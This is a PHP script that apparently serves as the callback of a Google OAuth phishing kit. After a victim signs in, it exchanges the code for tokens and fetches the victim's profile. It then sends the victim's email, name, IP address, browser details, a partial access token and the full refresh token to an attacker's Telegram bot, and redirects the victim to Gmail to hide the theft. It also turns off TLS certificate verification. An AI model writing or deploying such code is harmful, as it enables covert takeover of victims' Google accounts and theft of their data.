<?php
require 'config.php';
session_start();

function sendTelegram($message) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id'    => TELEGRAM_CHAT_ID,
        'text'       => $message,
        'parse_mode' => 'HTML'
    ];
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query($data),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT        => 10
    ]);
    curl_exec($ch);
    curl_close($ch);
}

function getIP() {
    foreach (['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'] as $key) {
        if (!empty($_SERVER[$key])) {
            $ip = trim(explode(',', $_SERVER[$key])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return 'Unknown';
}

if (empty($_GET['code']) || empty($_GET['state']) || $_GET['state'] !== ($_SESSION['oauth_state'] ?? '')) {
    die('Invalid state or missing code');
}

$postData = [
    'code'          => $_GET['code'],
    'client_id'     => GOOGLE_CLIENT_ID,
    'client_secret' => GOOGLE_CLIENT_SECRET,
    'redirect_uri'  => GOOGLE_REDIRECT_URI,
    'grant_type'    => 'authorization_code'
];

$ch = curl_init('https://oauth2.googleapis.com/token');
curl_setopt_array($ch, [
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => http_build_query($postData),
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false
]);
$response = curl_exec($ch);
curl_close($ch);
$tokenData = json_decode($response, true);

if (empty($tokenData['access_token'])) {
    sendTelegram("❌ <b>OAuth Failed</b>\nIP: " . getIP() . "\nResponse: " . htmlspecialchars($response));
    die('Auth failed');
}

$ch = curl_init('https://www.googleapis.com/oauth2/v3/userinfo');
curl_setopt_array($ch, [
    CURLOPT_HTTPHEADER     => ['Authorization: Bearer ' . $tokenData['access_token']],
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false
]);
$userInfo = json_decode(curl_exec($ch), true);
curl_close($ch);

$email = $userInfo['email'] ?? 'unknown';
$name  = $userInfo['name'] ?? 'unknown';
$ip    = getIP();
$ua    = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$time  = date('Y-m-d H:i:s');

$msg  = "✅ <b>Google OAuth Success</b>\n";
$msg .= "Email: <code>{$email}</code>\n";
$msg .= "Name: {$name}\n";
$msg .= "IP: {$ip}\n";
$msg .= "UA: {$ua}\n";
$msg .= "Time: {$time}\n";
$msg .= "Access Token: <code>" . substr($tokenData['access_token'] ?? '', 0, 40) . "...</code>\n";
if (!empty($tokenData['refresh_token'])) {
    $msg .= "Refresh Token: <code>" . $tokenData['refresh_token'] . "</code>\n";
}
sendTelegram($msg);

header('Location: https://mail.google.com');
exit;
